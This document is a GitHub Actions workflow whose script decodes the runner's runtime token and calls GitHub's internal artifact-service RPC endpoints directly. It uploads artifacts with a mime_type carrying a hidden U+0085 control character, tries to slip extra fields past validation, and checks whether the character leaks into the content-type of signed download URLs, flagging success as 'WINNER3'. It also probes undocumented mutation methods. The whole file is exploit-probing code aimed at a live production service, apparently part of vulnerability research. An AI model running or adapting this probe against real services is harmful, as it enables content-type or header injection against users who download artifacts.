name: race3

on:
  workflow_dispatch:

jobs:
  probe:
    runs-on: ubuntu-latest
    permissions:
      actions: write
      contents: read
    steps:
      - uses: actions/github-script@v7
        with:
          script: |
            const https = require('node:https');
            const crypto = require('node:crypto');

            const endpoint = process.env.ACTIONS_RESULTS_URL || '';
            const token = process.env.ACTIONS_RUNTIME_TOKEN || '';
            const claims = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString('utf8'));
            let runBackendId, jobBackendId;
            for (const s of String(claims.scp || '').split(' ')) {
              if (s.startsWith('Actions.Results:')) {
                const p = s.split(':'); runBackendId = p[1]; jobBackendId = p[2];
              }
            }
            const SVC = endpoint.replace(/\/+$/, '')
              + '/twirp/github.actions.results.api.v1.ArtifactService/';
            const ODD = '\u0085application/json';
            const IDS = { workflow_run_backend_id: runBackendId,
                          workflow_job_run_backend_id: jobBackendId };
            const repo = process.env.GITHUB_REPOSITORY;
            const [owner, shortRepo] = repo.split('/');
            const probe = Buffer.from('{"probe":"finalize-field"}');
            const digest = 'sha256:' + crypto.createHash('sha256').update(probe).digest('hex');

            async function rpc(method, body) {
              try {
                const r = await fetch(SVC + method, { method: 'POST',
                  headers: { Authorization: 'Bearer ' + token, 'Content-Type': 'application/json' },
                  body: JSON.stringify(body) });
                const text = await r.text();
                let json = null; try { json = JSON.parse(text); } catch (e) {}
                return { status: r.status, json, text: text.slice(0, 160) };
              } catch (e) { return { status: 0, json: null, text: String(e).slice(0, 160) }; }
            }
            function put(url, body, ct) {
              return new Promise((resolve) => {
                const u = new URL(url);
                const req = https.request({ method: 'PUT', hostname: u.hostname,
                  path: u.pathname + u.search,
                  headers: { 'x-ms-blob-type': 'BlockBlob', 'x-ms-blob-content-type': ct,
                             'x-ms-version': '2021-08-06',
                             'content-length': Buffer.byteLength(body) } },
                  (res) => { res.resume(); res.on('end', () => resolve(res.statusCode)); });
                req.on('error', () => resolve('ERR')); req.end(body);
              });
            }
            const urlOf = (r) => r.json && (r.json.signedUploadUrl || r.json.signed_upload_url);
            const idOf = (r) => r.json && String(r.json.artifactId || r.json.artifact_id || '');
            async function restRsct(id) {
              try {
                const r = await github.request(
                  'GET /repos/{owner}/{repo}/actions/artifacts/{artifact_id}/{archive_format}',
                  { owner, repo: shortRepo, artifact_id: Number(id), archive_format: 'zip',
                    request: { redirect: 'manual' } });
                return new URL(r.headers.location).searchParams.get('rsct');
              } catch (e) {
                const loc = e.response?.headers?.location;
                if (loc) { try { return new URL(loc).searchParams.get('rsct'); } catch (x) {} }
                return 'ERR';
              }
            }

            // Which request fields does the service actually accept? protojson rejects
            // unknown fields outright, so a 200 here means the field exists - and the
            // interesting case is a field that can set version/mime_type AFTER the
            // version<=6 create has already stored an unvalidated mime_type.
            const cases = [
              ['finalize-plain',      6, ODD,                {}],
              ['finalize-version7',   6, ODD,                { version: 7 }],
              ['finalize-mime-odd',   7, 'application/json', { mime_type: ODD }],
              ['finalize-mime-json',  6, ODD,                { mime_type: 'application/json' }],
              ['finalize-both',       6, ODD,                { version: 7, mime_type: ODD }],
              ['create-v5-odd',       5, ODD,                {}],
              ['create-v0-odd',       0, ODD,                {}],
            ];

            for (const [label, version, mime, extra] of cases) {
              const name = `probe-${label}-${Date.now()}`;
              const c = await rpc('CreateArtifact', { ...IDS, name, version, mime_type: mime });
              if (c.status !== 200) { core.info(`[${label}] create ${c.status} ${c.text}`); continue; }
              const url = urlOf(c);
              const up = await put(url, probe, ODD);
              const f = await rpc('FinalizeArtifact',
                { ...IDS, name, size: String(probe.length), hash: digest, ...extra });
              const id = idOf(f);
              let rest = null, twirp = null;
              if (id) rest = await restRsct(id);
              const v = await rpc('GetSignedArtifactURL', { ...IDS, name });
              const su = v.json && (v.json.signedUrl || v.json.signed_url);
              if (su) { try { twirp = new URL(su).searchParams.get('rsct'); } catch (e) {} }
              const odd = [rest, twirp].some(x => typeof x === 'string' && x.includes('\u0085'));
              core.info(`[${label}] create=200 put=${up} finalize=${f.status} id=${id} `
                + `rest=${JSON.stringify(rest)} twirp=${JSON.stringify(twirp)} `
                + `ODD=${odd} ${f.status === 200 ? '' : f.text}`);
              if (odd) core.info(`WINNER3 ${JSON.stringify({ label, id,
                repository: `${repo}/actions/artifacts/${id}/zip` })}`);
            }

            // Does any other method exist that could mutate an artifact after the fact?
            for (const method of ['UpdateArtifact', 'PatchArtifact', 'SetArtifactMimeType',
                                  'MigrateArtifact', 'ListArtifacts']) {
              const r = await rpc(method, { ...IDS, name: 'nope' });
              core.info(`[method ${method}] ${r.status} ${r.text}`);
            }
